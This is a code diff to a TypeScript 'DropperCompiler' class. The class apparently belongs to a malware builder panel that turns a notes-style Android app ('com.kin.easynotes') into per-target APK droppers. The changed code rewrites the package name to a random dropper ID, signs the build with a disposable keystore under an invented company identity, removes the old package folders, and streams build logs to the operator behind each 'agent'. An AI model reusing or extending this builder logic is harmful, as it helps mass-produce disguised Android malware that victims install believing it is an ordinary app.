@@ -37,7 +37,7 @@ class DropperCompiler {
 
     public addLog(message: string) {
         // If the agent's creator is connected, send the log message in real time.
-        if (connectedUsers[this.createdBy] && !message.includes("/")) {
+        if (connectedUsers[this.createdBy]) {
             io.to(connectedUsers[this.createdBy]).emit("agent-log-" + this.agentID, message)
         }
 
@@ -182,7 +182,7 @@ class DropperCompiler {
                 "-storepass", "123454321",
                 "-keyalg", "RSA",
                 "-keysize", "2048",
-                "-validity", "10000",
+                "-validity", "10",
                 "-alias", "key0",
                 "-keypass", "123454321",
                 "-dname", "CN=Li Wei, OU=Mobile Engineering, O=DragonSoft Technologies, L=Shanghai, S=Shanghai Municipality, C=CN"
@@ -250,7 +250,7 @@ class DropperCompiler {
     }
 
     private async changePackageName(): Promise<void> {
-        const oldPackage = "com.topdown.omnisec";
+        const oldPackage = "com.kin.easynotes";
         const newPackage = this.dropperID;
 
         this.addLog(`🎯 New random package: ${newPackage}`);
@@ -322,7 +322,7 @@ class DropperCompiler {
         updateJavaFiles(newPath);
 
         // --- 6️⃣ Remove old package directories ---
-        fs.rmSync(path.join(srcPath, "com", "topdown"), {recursive: true, force: true});
+        fs.rmSync(path.join(srcPath, "com", "kin"), {recursive: true, force: true}); //TODO
 
         this.addLog(`✅ Package renamed to: ${newPackage}`);
     }
@@ -395,8 +395,9 @@ class DropperCompiler {
             "build",
             "outputs",
             "apk",
+            "default",
             "release",
-            "app-release.apk"
+            "app-default-release.apk"
         );
 
         const maxRetryTime = 10000; // 10 seconds
